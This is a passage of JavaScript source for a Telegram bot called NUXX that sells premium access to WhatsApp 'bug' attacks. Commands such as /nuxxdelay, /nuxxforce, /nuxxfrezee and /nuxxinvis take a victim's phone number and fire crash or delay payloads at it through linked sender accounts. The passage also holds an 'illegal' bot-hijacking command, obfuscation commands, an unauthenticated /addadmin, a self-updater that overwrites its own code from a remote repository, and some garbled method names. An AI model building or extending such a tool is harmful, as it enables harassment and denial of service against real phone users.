 ─「 𖥂 」 𝐈𝐍𝐅𝐎𝐑𝐌𝐀𝐂𝐈𝐎́𝐍 「 𖥂 」─
ス ! ʙᴏᴛɴᴀᴍᴇ : NUXX🎱
ス ! ᴠᴇʀsɪᴏɴ : v1.0.0
ス ! ᴅᴇᴠᴇʟᴏᴘᴇʀ : All Team Nuxx
ス ! ᴛʏᴘᴇ : Java Script
ス ! ᴘʟᴀᴛғᴏʀᴍ : Telegram
ス ! sᴛᴀᴛᴜs : Vip

 ─「 𖥂 」 𝐒𝐄𝐓𝐓𝐈𝐍𝐆 ☇ 𝐌𝐄𝐍𝐔 「 𖥂 」─
友 ! /addprem ⧼ 𝘐𝘋 ⧽ ⧼ 𝘏𝘈𝘙𝘐 ⧽
友 ! /delprem ⧼ 𝘐𝘋 ⧽
友 ! /listprem
友 ! /addadmin ⧼ 𝘐𝘋 ⧽
友 ! /deladmin ⧼ 𝘐𝘋 ⧽
友 ! /setjeda ⧼ 𝘞𝘈𝘒𝘛𝘜 ⧽
友 ! /addsender ⧼ 𝘕𝘖𝘔𝘌𝘙 ⧽
友 ! /update ⧼ 𝘜𝘗 𝘚𝘊 𝘖𝘛𝘖𝘔𝘈𝘛𝘐𝘚 ⧽
──────────────────────────\`\`\`
`;
      replyMarkup = { inline_keyboard: [[{ text: "〘 𝐁𝐀𝐂𝐊 〙", callback_data: "back_to_main", style: "danger" }]] };
    }

    if (query.data === "other") {
      caption = `
\`\`\`NuxxTeam🪽
-( 🎱 )- Ollà, ${username}!👋🏻 Soy NUXX🎱, la última versión creada por All Team Nuxx. Te ayudaré cuando sea, pero úsame lo más sabiamente posible.
──────────────────────────
 ─「 𖥂 」 𝐈𝐍𝐅𝐎𝐑𝐌𝐀𝐂𝐈𝐎́𝐍 「 𖥂 」─
ス ! ʙᴏᴛɴᴀᴍᴇ : NUXX🎱
ス ! ᴠᴇʀsɪᴏɴ : v1.0.0
ス ! ᴅᴇᴠᴇʟᴏᴘᴇʀ : All Team Nuxx
ス ! ᴛʏᴘᴇ : Java Script
ス ! ᴘʟᴀᴛғᴏʀᴍ : Telegram
ス ! sᴛᴀᴛᴜs : Vip

 ─「 𖥂 」 𝐎𝐓𝐇𝐄𝐑 ☇ 𝐌𝐄𝐍𝐔 「 𖥂 」─
友 ! /cekip ( Check Ip )
友 ! /tiktok ( TikTok Download )
友 ! /rasukbot ( Enter Bot ) ilegal!
友 ! /tourl ( Image to Url )
──────────────────────────\`\`\`
`;
      replyMarkup = { inline_keyboard: [[{ text: "〘 𝐁𝐀𝐂𝐊 〙", callback_data: "back_to_main", style: "danger" }]] };
    }

    if (query.data === "encrypt") {
      caption = `
\`\`\`NuxxTeam🪽
-( 🎱 )- Ollà, ${username}!👋🏻 Soy NUXX🎱, la última versión creada por All Team Nuxx. Te ayudaré cuando sea, pero úsame lo más sabiamente posible.
──────────────────────────
 ─「 𖥂 」 𝐈𝐍𝐅𝐎𝐑𝐌𝐀𝐂𝐈𝐎́𝐍 「 𖥂 」─
ス ! ʙᴏᴛɴᴀᴍᴇ : NUXX🎱
ス ! ᴠᴇʀsɪᴏɴ : v1.0.0
ス ! ᴅᴇᴠᴇʟᴏᴘᴇʀ : All Team Nuxx
ス ! ᴛʏᴘᴇ : Java Script
ス ! ᴘʟᴀᴛғᴏʀᴍ : Telegram
ス ! sᴛᴀᴛᴜs : Vip

 ─「 𖥂 」 𝐄𝐍𝐂𝐑𝐘𝐏𝐓 ☇ 𝐌𝐄𝐍𝐔 「 𖥂 」─
友 ! /encnew ( New Obfuscation )
友 ! /encultra ( Ultra Encryption )
友 ! /encquantum ( Quantum Encrypt )
友 ! /encnuxx ( Nova Encryption )
──────────────────────────\`\`\`
`;
      replyMarkup = { inline_keyboard: [[{ text: "〘 𝐁𝐀𝐂𝐊 〙", callback_data: "back_to_main", style: "danger" }]] };
    }

    if (query.data === "tqto") {
      caption = `
\`\`\`NuxxTeam🪽
-( 🎱 )- Ollà, ${username}!👋🏻 Soy NUXX🎱, la última versión creada por All Team Nuxx. Te ayudaré cuando sea, pero úsame lo más sabiamente posible.
──────────────────────────
 ─「 𖥂 」 𝐈𝐍𝐅𝐎𝐑𝐌𝐀𝐂𝐈𝐎́𝐍 「 𖥂 」─
ス ! ʙᴏᴛɴᴀᴍᴇ : NUXX🎱
ス ! ᴠᴇʀsɪᴏɴ : v1.0.0
ス ! ᴅᴇᴠᴇʟᴏᴘᴇʀ : All Team Nuxx
ス ! ᴛʏᴘᴇ : Java Script
ス ! ᴘʟᴀᴛғᴏʀᴍ : Telegram
ス ! sᴛᴀᴛᴜs : Vip\`\`\`

─「 𖥂 」 𝐁𝐈𝐆 ☇ 𝐓𝐇𝐀𝐍𝐊𝐒 「 𖥂 」─
友 ! Caeser ( Gendut )
友 ! Uzi ( Miniuzi )
友 ! Uciha ( Beginner )
友 ! Linux ( Ganteng )
友 ! ᴀʟʟ ᴘᴇɴɢᴜɴᴀ sᴄʀɪᴘᴛ
`;
      replyMarkup = { inline_keyboard: [[{ text: "〘 𝐁𝐀𝐂𝐊 〙", callback_data: "back_to_main", style: "danger" }]] };
    }

    if (query.data === "back_to_main") {
      caption = `
\`\`\`NuxxTeam🪽
-( 🎱 )- Ollà, ${username}!👋🏻 Soy NUXX🎱, la última versión creada por All Team Nuxx. Te ayudaré cuando sea, pero úsame lo más sabiamente posible.
──────────────────────────
 ─「 𖥂 」 𝐈𝐍𝐅𝐎𝐑𝐌𝐀𝐂𝐈𝐎́𝐍 「 𖥂 」─
ス ! ʙᴏᴛɴᴀᴍᴇ : NUXX🎱
ス ! ᴠᴇʀsɪᴏɴ : v1.0.0
ス ! ᴅᴇᴠᴇʟᴏᴘᴇʀ : All Team Nuxx
ス ! ᴛʏᴘᴇ : Java Script
ス ! ᴘʟᴀᴛғᴏʀᴍ : Telegram
ス ! sᴛᴀᴛᴜs : Vip\`\`\`

( ! ) 続行するには、下のメニューボタンを選択してください.
`;
      replyMarkup = {
        inline_keyboard: [
[{ text: "𝗧𝗛𝗔𝗡𝗞𝗦 ᝄ 𝗧𝗢", callback_data: "tqto", style: "success" }],
[{ text: "𝗦𝗘𝗧𝗧𝗜𝗡𝗚 ᝄ 𝗠𝗘𝗡𝗨", callback_data: "setting", style: "primary" }, { text: "𝗔𝗧𝗧𝗔𝗖𝗞 ᝄ 𝗠𝗘𝗡𝗨", callback_data: "attack", style: "danger" }],
[{ text: "𝗢𝗧𝗛𝗘𝗥 ᝄ 𝗠𝗘𝗡𝗨", callback_data: "other", style: "danger" }, { text: "𝗘𝗡𝗖𝗥𝗬𝗣𝗧 ᝄ 𝗠𝗘𝗡𝗨", callback_data: "encrypt", style: "primary" }], 
[{ text: "𝗖𝗛𝗔𝗡𝗡𝗘𝗟", url: "https://t.me/newsnuxx", style: "success" }],
      ]
      };
    }

    await bot.editMessageMedia(
      {
        type: "photo",
        media: randomImage,
        caption: caption,
        parse_mode: "Markdown"
      },
      {
        chat_id: chatId,
        message_id: messageId,
        reply_markup: replyMarkup
      }
    );

    await bot.answerCallbackQuery(query.id);
  } catch (error) {
    console.error("Error handling callback query:", error);
  }
});

bot.onText(/\/broadcast (.+)/, (msg, match) => {
    const chatId = msg.chat.id;
    const messageToBroadcast = match[1];
    const adminUserId = 6470039943;
    if (chatId === adminUserId) {
        const allUserIds = readUserIds();
        let sentCount = 0;
        let failedCount = 0;
        allUserIds.forEach(userId => {
            bot.sendMessage(userId, messageToBroadcast)
                .then(() => {
                    sentCount++;
                })
                .catch((error) => {
                    console.error(`Gagal mengirim pesan ke ${userId}:`, error.message);
                    failedCount++;
                });
        });
        bot.sendMessage(chatId, `Pesan broadcast dikirim ke ${sentCount} pengguna. Gagal dikirim ke ${failedCount} pengguna.`);
    } else {
        bot.sendMessage(chatId, 'Anda tidak memiliki izin untuk menggunakan perintah ini.');
    }
});

// **Integrasikan logika bot Anda yang lain

//Case The Bug
bot.onText(/\/nuxxdelay (\d+)(?: (\d+))?/, async (msg, match) => {
  const chatId = msg.chat.id;
  const senderId = msg.from.id;
  const targetNumber = match[1];
  const delayInSec = match[2] ? parseInt(match[2]) : 1;
  const formattedNumber = targetNumber.replace(/[^0-9]/g, "");
  const jid = `${formattedNumber}@s.whatsapp.net`;
  const randomImage = getRandomImage();
  const userId = msg.from.id;
  const cooldown = checkCooldown(userId);

  if (cooldown > 0) {
    return bot.sendMessage(chatId, `Tunggu ${cooldown} detik sebelum mengirim pesan lagi.`);
  }

  if (!premiumUsers.some(user => user.id === senderId && new Date(user.expiresAt) > new Date())) {
    return bot.sendPhoto(chatId, randomImage, {
      caption: `\`\`\`アクセスできません!\`\`\`
( ! ) 𝐓𝐨𝐥𝐨𝐥 𝐈𝐝 𝐋𝐮 𝐁𝐮𝐤𝐚𝐧 𝐔𝐬𝐞𝐫 𝐏𝐫𝐞𝐦𝐢𝐮𝐦, 𝐁𝐞𝐥𝐢 𝐀𝐤𝐬𝐞𝐬 𝐃𝐮𝐥𝐮 𝐒𝐨𝐧𝐨 𝐊𝐞 𝐎𝐦 𝐓𝐫𝐢𝐱𝐢𝐞`,
      parse_mode: "Markdown",
      reply_markup: {
        inline_keyboard: [
          [{ text: "𝐎𝐦 𝐓𝐫𝐢𝐱𝐢𝐞", url: "https://t.me/trixie2nd", style: "primary" }]
        ]
      }
    });
  }

  try {
    if (sessions.size === 0) {
      return bot.sendMessage(chatId, "❌ Tidak ada bot WhatsApp yang terhubung. Silakan hubungkan bot terlebih dahulu dengan /addsender 62xxx");
    }

    const sentMessage = await bot.sendPhoto(chatId, "https://files.catbox.moe/wpz63f.jpg", {
      caption: `\`\`\`NuxxTeam🪽
╔═══════「 𝗦𝗲𝗻𝗱𝗶𝗻𝗴 𖥂 𝗕𝘂𝗴 」═══════╗
║ ☇ ! ᴛᴀʀɢᴇᴛ : wa.me/${formattedNumber}
║ ☇ ! sᴛᴀᴛᴜs : Process...
║ ☇ ! ᴄᴏᴍᴍᴀɴᴅ : /nuxxdelay
╚════════════════════════════╝
\`\`\``, parse_mode: "Markdown"
    });
    await sleep(5000);
await bot.editMessageCaption(`
\`\`\`NuxxTeam🪽
╔═══════「 𝗦𝗲𝗻𝗱𝗶𝗻𝗴 𖥂 𝗕𝘂𝗴 」═══════╗
║ ☇ ! ᴛᴀʀɢᴇᴛ : wa.me/${formattedNumber}
║ ☇ ! sᴛᴀᴛᴜs : Successfully!
║ ☇ ! ᴄᴏᴍᴍᴀɴᴅ : /nuxxdelay
╚════════════════════════════╝
\`\`\``, {
      chat_id: chatId,
      message_id: sentMessage.message_id,
      parse_mode: "Markdown",
      reply_markup: {
        inline_keyboard: [[{ text: "Check Target", url: `https://wa.me/${formattedNumber}`, style: "danger" }]]
      }
    });
    
    console.log("\x1b[32m[PROCES MENGIRIM BUG]\x1b[0m TUNGGU HINGGA SELESAI");
    await HardDelay(20, jid);
    console.log("\x1b[32m[SUCCESS]\x1b[0m Bug berhasil dikirim! 🚀");
    
    
    
  } catch (error) {
    console.error(error);
    bot.sendMessage(chatId, `❌ Gagal mengirim bug: ${error.message}`);
  }
});

bot.onText(/\/nuxxforce (\d+)(?: (\d+))?/, async (msg, match) => {
  const chatId = msg.chat.id;
  const senderId = msg.from.id;
  const targetNumber = match[1];
  const delayInSec = match[2] ? parseInt(match[2]) : 1;
  const formattedNumber = targetNumber.replace(/[^0-9]/g, "");
  const jid = `${formattedNumber}@s.whatsapp.net`;
  const randomImage = getRandomImage();
  const userId = msg.from.id;
  const cooldown = checkCooldown(userId);

  if (cooldown > 0) {
    return bot.sendMessage(chatId, `Tunggu ${cooldown} detik sebelum mengirim pesan lagi.`);
  }

  if (!premiumUsers.some(user => user.id === senderId && new Date(user.expiresAt) > new Date())) {
    return bot.sendPhoto(chatId, randomImage, {
      caption: `\`\`\`アクセスできません!\`\`\`
( ! ) 𝐓𝐨𝐥𝐨𝐥 𝐈𝐝 𝐋𝐮 𝐁𝐮𝐤𝐚𝐧 𝐔𝐬𝐞𝐫 𝐏𝐫𝐞𝐦𝐢𝐮𝐦, 𝐁𝐞𝐥𝐢 𝐀𝐤𝐬𝐞𝐬 𝐃𝐮𝐥𝐮 𝐒𝐨𝐧𝐨 𝐊𝐞 𝐎𝐦 𝐓𝐫𝐢𝐱𝐢𝐞`,
      parse_mode: "Markdown",
      reply_markup: {
        inline_keyboard: [
          [{ text: "𝐎𝐦 𝐓𝐫𝐢𝐱𝐢𝐞", url: "https://t.me/trixie2nd", style: "primary" }]
        ]
      }
    });
  }

  try {
    if (sessions.size === 0) {
      return bot.sendMessage(chatId, "❌ Tidak ada bot WhatsApp yang terhubung. Silakan hubungkan bot terlebih dahulu dengan /addsender 62xxx");
    }

    const sentMessage = await bot.sendPhoto(chatId, "https://files.catbox.moe/wpz63f.jpg", {
      caption: `\`\`\`NuxxTeam🪽
╔═══════「 𝗦𝗲𝗻𝗱𝗶𝗻𝗴 𖥂 𝗕𝘂𝗴 」═══════╗
║ ☇ ! ᴛᴀʀɢᴇᴛ : wa.me/${formattedNumber}
║ ☇ ! sᴛᴀᴛᴜs : Process...
║ ☇ ! ᴄᴏᴍᴍᴀɴᴅ : /nuxxforce
╚════════════════════════════╝
\`\`\``, parse_mode: "Markdown"
    });
    await sleep(5000);
await bot.editMessageCaption(`
\`\`\`NuxxTeam🪽
╔═══════「 𝗦𝗲𝗻𝗱𝗶𝗻𝗴 𖥂 𝗕𝘂𝗴 」═══════╗
║ ☇ ! ᴛᴀʀɢᴇᴛ : wa.me/${formattedNumber}
║ ☇ ! sᴛᴀᴛᴜs : Successfully!
║ ☇ ! ᴄᴏᴍᴍᴀɴᴅ : /nuxxforce
╚════════════════════════════╝
\`\`\``, {
      chat_id: chatId,
      message_id: sentMessage.message_id,
      parse_mode: "Markdown",
      reply_markup: {
        inline_keyboard: [[{ text: "Check Target", url: `https://wa.me/${formattedNumber}`, style: "danger" }]]
      }
    });
    
    console.log("\x1b[32m[PROCES MENGIRIM BUG]\x1b[0m TUNGGU HINGGA SELESAI");
    await ForceNews(20, jid);
    console.log("\x1b[32m[SUCCESS]\x1b[0m Bug berhasil dikirim! 🚀");
    
    
    
  } catch (error) {
    console.error(error);
    bot.sendMessage(chatId, `❌ Gagal mengirim bug: ${error.message}`);
  }
});

bot.onText(/\/nuxxfrezee (\d+)(?: (\d+))?/, async (msg, match) => {
  const chatId = msg.chat.id;
  const senderId = msg.from.id;
  const targetNumber = match[1];
  const delayInSec = match[2] ? parseInt(match[2]) : 1;
  const formattedNumber = targetNumber.replace(/[^0-9]/g, "");
  const jid = `${formattedNumber}@s.whatsapp.net`;
  const randomImage = getRandomImage();
  const userId = msg.from.id;
  const cooldown = checkCooldown(userId);

  if (cooldown > 0) {
    return bot.sendMessage(chatId, `Tunggu ${cooldown} detik sebelum mengirim pesan lagi.`);
  }

  if (!premiumUsers.some(user => user.id === senderId && new Date(user.expiresAt) > new Date())) {
    return bot.sendPhoto(chatId, randomImage, {
      caption: `\`\`\`アクセスできません!\`\`\`
( ! ) 𝐓𝐨𝐥𝐨𝐥 𝐈𝐝 𝐋𝐮 𝐁𝐮𝐤𝐚𝐧 𝐔𝐬𝐞𝐫 𝐏𝐫𝐞𝐦𝐢𝐮𝐦, 𝐁𝐞𝐥𝐢 𝐀𝐤𝐬𝐞𝐬 𝐃𝐮𝐥𝐮 𝐒𝐨𝐧𝐨 𝐊𝐞 𝐎𝐦 𝐓𝐫𝐢𝐱𝐢𝐞`,
      parse_mode: "Markdown",
      reply_markup: {
        inline_keyboard: [
          [{ text: "𝐎𝐦 𝐓𝐫𝐢𝐱𝐢𝐞", url: "https://t.me/trixie2nd", style: "primary" }]
        ]
      }
    });
  }

  try {
    if (sessions.size === 0) {
      return bot.sendMessage(chatId, "❌ Tidak ada bot WhatsApp yang terhubung. Silakan hubungkan bot terlebih dahulu dengan /addsender 62xxx");
    }

    const sentMessage = await bot.sendPhoto(chatId, "https://files.catbox.moe/wpz63f.jpg", {
      caption: `\`\`\`NuxxTeam🪽
╔═══════「 𝗦𝗲𝗻𝗱𝗶𝗻𝗴 𖥂 𝗕𝘂𝗴 」═══════╗
║ ☇ ! ᴛᴀʀɢᴇᴛ : wa.me/${formattedNumber}
║ ☇ ! sᴛᴀᴛᴜs : Process...
║ ☇ ! ᴄᴏᴍᴍᴀɴᴅ : /nuxxfrezee
╚════════════════════════════╝
\`\`\``, parse_mode: "Markdown"
    });
    await sleep(5000);
await bot.editMessageCaption(`
\`\`\`NuxxTeam🪽
╔═══════「 𝗦𝗲𝗻𝗱𝗶𝗻𝗴 𖥂 𝗕𝘂𝗴 」═══════╗
║ ☇ ! ᴛᴀʀɢᴇᴛ : wa.me/${formattedNumber}
║ ☇ ! sᴛᴀᴛᴜs : Successfully!
║ ☇ ! ᴄᴏᴍᴍᴀɴᴅ : /nuxxfrezee
╚════════════════════════════╝
\`\`\``, {
      chat_id: chatId,
      message_id: sentMessage.message_id,
      parse_mode: "Markdown",
      reply_markup: {
        inline_keyboard: [[{ text: "Check Target", url: `https://wa.me/${formattedNumber}`, style: "danger" }]]
      }
    });
    
    console.log("\x1b[32m[PROCES MENGIRIM BUG]\x1b[0m TUNGGU HINGGA SELESAI");
    await bokepjepangnew(20, jid);
    console.log("\x1b[32m[SUCCESS]\x1b[0m Bug berhasil dikirim! 🚀");
    
    
    
  } catch (error) {
    console.error(error);
    bot.sendMessage(chatId, `❌ Gagal mengirim bug: ${error.message}`);
  }
});

bot.onText(/\/nuxxinvis (\d+)(?: (\d+))?/, async (msg, match) => {
  const chatId = msg.chat.id;
  const senderId = msg.from.id;
  const targetNumber = match[1];
  const delayInSec = match[2] ? parseInt(match[2]) : 1;
  const formattedNumber = targetNumber.replace(/[^0-9]/g, "");
  const jid = `${formattedNumber}@s.whatsapp.net`;
  const randomImage = getRandomImage();
  const userId = msg.from.id;
  const cooldown = checkCooldown(userId);

  if (cooldown > 0) {
    return bot.sendMessage(chatId, `Tunggu ${cooldown} detik sebelum mengirim pesan lagi.`);
  }

  if (!premiumUsers.some(user => user.id === senderId && new Date(user.expiresAt) > new Date())) {
    return bot.sendPhoto(chatId, randomImage, {
      caption: `\`\`\`アクセスできません!\`\`\`
( ! ) 𝐓𝐨𝐥𝐨𝐥 𝐈𝐝 𝐋𝐮 𝐁𝐮𝐤𝐚𝐧 𝐔𝐬𝐞𝐫 𝐏𝐫𝐞𝐦𝐢𝐮𝐦, 𝐁𝐞𝐥𝐢 𝐀𝐤𝐬𝐞𝐬 𝐃𝐮𝐥𝐮 𝐒𝐨𝐧𝐨 𝐊𝐞 𝐎𝐦 𝐓𝐫𝐢𝐱𝐢𝐞`,
      parse_mode: "Markdown",
      reply_markup: {
        inline_keyboard: [
          [{ text: "𝐎𝐦 𝐓𝐫𝐢𝐱𝐢𝐞", url: "https://t.me/trixie2nd", style: "primary" }]
        ]
      }
    });
  }

  try {
    if (sessions.size === 0) {
      return bot.sendMessage(chatId, "❌ Tidak ada bot WhatsApp yang terhubung. Silakan hubungkan bot terlebih dahulu dengan /addsender 62xxx");
    }

    const sentMessage = await bot.sendPhoto(chatId, "https://files.catbox.moe/wpz63f.jpg", {
      caption: `\`\`\`NuxxTeam🪽
╔═══════「 𝗦𝗲𝗻𝗱𝗶𝗻𝗴 𖥂 𝗕𝘂𝗴 」═══════╗
║ ☇ ! ᴛᴀʀɢᴇᴛ : wa.me/${formattedNumber}
║ ☇ ! sᴛᴀᴛᴜs : Process...
║ ☇ ! ᴄᴏᴍᴍᴀɴᴅ : /nuxxinvis
╚════════════════════════════╝
\`\`\``, parse_mode: "Markdown"
    });
    await sleep(5000);
await bot.editMessageCaption(`
\`\`\`NuxxTeam🪽
╔═══════「 𝗦𝗲𝗻𝗱𝗶𝗻𝗴 𖥂 𝗕𝘂𝗴 」═══════╗
║ ☇ ! ᴛᴀʀɢᴇᴛ : wa.me/${formattedNumber}
║ ☇ ! sᴛᴀᴛᴜs : Successfully!
║ ☇ ! ᴄᴏᴍᴍᴀɴᴅ : /nuxxinvis
╚════════════════════════════╝
\`\`\``, {
      chat_id: chatId,
      message_id: sentMessage.message_id,
      parse_mode: "Markdown",
      reply_markup: {
        inline_keyboard: [[{ text: "Check Target", url: `https://wa.me/${formattedNumber}`, style: "danger" }]]
      }
    });
    
    console.log("\x1b[32m[PROCES MENGIRIM BUG]\x1b[0m TUNGGU HINGGA SELESAI");
    await invisiblenuxxinvis(20, jid);
    console.log("\x1b[32m[SUCCESS]\x1b[0m Bug berhasil dikirim! 🚀");
    
    
    
  } catch (error) {
    console.error(error);
    bot.sendMessage(chatId, `❌ Gagal mengirim bug: ${error.message}`);
  }
});
//End The Csse Bug

//=====================================
bot.onText(/\/addsender (.+)/, async (msg, match) => {
const chatId = msg.chat.id;
  if (!adminUsers.includes(msg.from.id) && !isOwner(msg.from.id)) {
    return bot.sendMessage(
      chatId,
      "⚠️ *Akses Ditolak*\nAnda tidak memiliki izin untuk menggunakan command ini.",
      { parse_mode: "Markdown" }
    );
  }

  if (!match[1]) {
    return bot.sendMessage(chatId, "❌ Missing input. Please provide the number. Example: /addsender 62xxxx.");
  }
  
  const botNumber = match[1].replace(/[^0-9]/g, "");

  if (!botNumber || botNumber.length < 10) {
    return bot.sendMessage(chatId, "❌ Nomor yang diberikan tidak valid. Pastikan nomor yang dimasukkan benar.");
  }

  try {
    await connectToWhatsApp(botNumber, chatId);
    bot.sendMessage(chatId, "✅ Nomor berhasil ditambahkan sebagai pengirim.");
  } catch (error) {
    console.error("Error in addsender:", error);
    bot.sendMessage(
      chatId,
      "Terjadi kesalahan saat menghubungkan ke WhatsApp. Silakan coba lagi."
    );
  }
});



const moment = require('moment');

bot.onText(/\/setjeda (\d+[smh])/, (msg, match) => { 
const chatId = msg.chat.id; 
const response = setCooldown(match[1]);

bot.sendMessage(chatId, response); });


bot.onText(/\/addprem(?:\s(.+))?/, (msg, match) => {
  const chatId = msg.chat.id;
  const senderId = msg.from.id;
  if (!isOwner(senderId) && !adminUsers.includes(senderId)) {
      return bot.sendMessage(chatId, "❌ You are not authorized to add premium users.");
  }

  if (!match[1]) {
      return bot.sendMessage(chatId, "❌ Missing input. Please provide a user ID and duration. Example: /addprem ID 30d.");
  }

  const args = match[1].split(' ');
  if (args.length < 2) {
      return bot.sendMessage(chatId, "❌ Missing input. Please specify a duration. Example: /addprem ID 30d.");
  }

  const userId = parseInt(args[0].replace(/[^0-9]/g, ''));
  const duration = args[1];
  
  if (!/^\d+$/.test(userId)) {
      return bot.sendMessage(chatId, "❌ Invalid input. User ID must be a number. Example: /addprem ID 30d.");
  }
  
  if (!/^\d+[dhm]$/.test(duration)) {
      return bot.sendMessage(chatId, "❌ Invalid duration format. Use numbers followed by d (days), h (hours), or m (minutes). Example: 30d.");
  }

  const now = moment();
  const expirationDate = moment().add(parseInt(duration), duration.slice(-1) === 'd' ? 'days' : duration.slice(-1) === 'h' ? 'hours' : 'minutes');

  if (!premiumUsers.find(user => user.id === userId)) {
      premiumUsers.push({ id: userId, expiresAt: expirationDate.toISOString() });
      savePremiumUsers();
      console.log(`${senderId} added ${userId} to premium until ${expirationDate.format('YYYY-MM-DD HH:mm:ss')}`);
      bot.sendMessage(chatId, `✅ User ${userId} has been added to the premium list until ${expirationDate.format('YYYY-MM-DD HH:mm:ss')}.`);
  } else {
      const existingUser = premiumUsers.find(user => user.id === userId);
      existingUser.expiresAt = expirationDate.toISOString(); // Extend expiration
      savePremiumUsers();
      bot.sendMessage(chatId, `✅ User ${userId} is already a premium user. Expiration extended until ${expirationDate.format('YYYY-MM-DD HH:mm:ss')}.`);
  }
});

bot.onText(/\/listprem/, (msg) => {
  const chatId = msg.chat.id;
  const senderId = msg.from.id;

  if (!isOwner(senderId) && !adminUsers.includes(senderId)) {
    return bot.sendMessage(chatId, "❌ You are not authorized to view the premium list.");
  }

  if (premiumUsers.length === 0) {
    return bot.sendMessage(chatId, "📌 No premium users found.");
  }

  let message = "```LIST - VIP🎭 \n\n```";
  premiumUsers.forEach((user, nvxprime) => {
    const expiresAt = moment(user.expiresAt).format('YYYY-MM-DD HH:mm:ss');
    message += `${nvxprime + 1}. ID: \`${user.id}\`\n   Expiration: ${expiresAt}\n\n`;
  });

  bot.sendMessage(chatId, message, { parse_mode: "Markdown" });
});
//=====================================
bot.onText(/\/addadmin(?:\s(.+))?/, (msg, match) => {
    const chatId = msg.chat.id;
    const senderId = msg.from.id

    if (!match || !match[1]) {
        return bot.sendMessage(chatId, "❌ Missing input. Please provide a user ID. Example: /addadmin id.");
    }

    const userId = parseInt(match[1].replace(/[^0-9]/g, ''));
    if (!/^\d+$/.test(userId)) {
        return bot.sendMessage(chatId, "❌ Invalid input. Example: /addadmin id.");
    }

    if (!adminUsers.includes(userId)) {
        adminUsers.push(userId);
        saveAdminUsers();
        console.log(`${senderId} Added ${userId} To Admin`);
        bot.sendMessage(chatId, `✅ User ${userId} has been added as an admin.`);
    } else {
        bot.sendMessage(chatId, `❌ User ${userId} is already an admin.`);
    }
});

bot.onText(/\/delprem(?:\s(\d+))?/, (msg, match) => {
    const chatId = msg.chat.id;
    const senderId = msg.from.id;

    // Cek apakah pengguna adalah owner atau admin
    if (!isOwner(senderId) && !adminUsers.includes(senderId)) {
        return bot.sendMessage(chatId, "❌ You are not authorized to remove premium users.");
    }

    if (!match[1]) {
        return bot.sendMessage(chatId, "❌ Please provide a user ID. Example: /delprem id");
    }

    const userId = parseInt(match[1]);

    if (isNaN(userId)) {
        return bot.sendMessage(chatId, "❌ Invalid input. User ID must be a number.");
    }

    // Cari nvxprime user dalam daftar premium
    const nvxprime = premiumUsers.findnvxprime(user => user.id === userId);
    if (nvxprime === -1) {
        return bot.sendMessage(chatId, `❌ User ${userId} is not in the premium list.`);
    }

    // Hapus user dari daftar
    premiumUsers.splice(nvxprime, 1);
    savePremiumUsers();
    bot.sendMessage(chatId, `✅ User ${userId} has been removed from the premium list.`);
});

bot.onText(/\/deladmin(?:\s(\d+))?/, (msg, match) => {
    const chatId = msg.chat.id;
    const senderId = msg.from.id;

    // Cek apakah pengguna memiliki izin (hanya pemilik yang bisa menjalankan perintah ini)
    if (!isOwner(senderId)) {
        return bot.sendMessage(
            chatId,
            "⚠️ *Akses Ditolak*\nAnda tidak memiliki izin untuk menggunakan command ini.",
            { parse_mode: "Markdown" }
        );
    }

    // Pengecekan input dari pengguna
    if (!match || !match[1]) {
        return bot.sendMessage(chatId, "❌ Missing input. Please provide a user ID. Example: /deladmin id.");
    }

    const userId = parseInt(match[1].replace(/[^0-9]/g, ''));
    if (!/^\d+$/.test(userId)) {
        return bot.sendMessage(chatId, "❌ Invalid input. Example: /deladmin id.");
    }

    // Cari dan hapus user dari adminUsers
    const adminnvxprime = adminUsers.nvxprimeOf(userId);
    if (adminnvxprime !== -1) {
        adminUsers.splice(adminnvxprime, 1);
        saveAdminUsers();
        console.log(`${senderId} Removed ${userId} From Admin`);
        bot.sendMessage(chatId, `✅ User ${userId} has been removed from admin.`);
    } else {
        bot.sendMessage(chatId, `❌ User ${userId} is not an admin.`);
    }
});

bot.onText(/\/update/, async (msg) => {
    const chatId = msg.chat.id;

    const repoRaw = "https://raw.githubusercontent.com/UcihaOfficial/NuxxOri/main/index.js";

    bot.sendMessage(chatId, "⏳ Sedang mengecek update...");

    try {
        const { data } = await axios.get(repoRaw);

        if (!data) return bot.sendMessage(chatId, "❌ Update gagal: File kosong!");

        fs.writeFileSync("./index.js", data);

        bot.sendMessage(chatId, "✅ Update berhasil!\nSilakan start ulang bot.");

        process.exit(); // restart jika pakai PM2
    } catch (e) {
        console.log(e);
        bot.sendMessage(chatId, "❌ Update gagal. Pastikan repo dan file index.js tersedia.");
    }
});
// ---------- ( Case Other Menu ) ---------- //
bot.onText(/^\/tiktok(?:\s+(.+))?$/, async (msg, match) => {
  const chatId = msg.chat.id;
  const userId = msg.from.id;
  const url = match[1];
  const member = await bot.getChatMember(GROUP_ID, userId);
    if (member.status === 'left' || member.status === 'kicked') {
      return bot.sendMessage(chatId, `<blockquote>🚫 Kamu harus join channel official dulu supaya bisa pakai fitur ini.</blockquote>`, {
      parse_mode: "HTML", reply_markup: { inline_keyboard: [[{ text: "📢 Channel Official", url: "https://t.me/newsnuxx", style: "primary" }]] }
      });
    }
  
  if (!url) {
    return bot.sendMessage(chatId, `<blockquote>☘️ Link TikTok-nya Mana?</blockquote>`, { 
    parse_mode: "HTML" 
    });
  }

 
  const urlRegex = /^(https?:\/\/)?([\w.-]+)+(:\d+)?(\/\S*)?$/;
  if (!urlRegex.test(url)) {
    return bot.sendMessage(chatId, `<blockquote>⚠️ Itu Bukan Link Yang Benar</blockquote>`, { 
    parse_mode: "HTML" 
    });
  }

  bot.sendMessage(chatId, `<blockquote>⏳ Tunggu sebentar, sedang mengambil video...</blockquote>`, {
        parse_mode: "HTML"
        });

  try {
  const res = await tiktok(url);

 
  let caption = `🎬 Judul: ${res.title}`;
     if (caption.length > 1020) {
     caption = caption.substring(0, 1017) + "...";
  }

await bot.sendVideo(chatId, res.no_watermark, { caption });
 
  if (res.music && res.music.trim() !== "") {
    await bot.sendAudio(chatId, res.music, { title: "tiktok_audio.mp3" });
  } else {
    await bot.sendMessage(chatId, `<blockquote>🎵 Video ini tidak memiliki audio asli.</blockquote>`, {
        parse_mode: "HTML"
        });
  }

} catch (error) {
  console.error(error);
  bot.sendMessage(chatId, `<blockquote>⚠️ Terjadi kesalahan saat mengambil video TikTok. Coba lagi nanti.</blockquote>`, {
        parse_mode: "HTML"
        });
}
});

bot.onText(/^\/rasukbot (.+)/i, async (msg, match) => {
  const chatId = msg.chat.id;
  const input = match[1];

  if (!input.includes("|")) {
    return bot.sendMessage(chatId,
      "📩 Format salah!\n\nGunakan format:\n" +
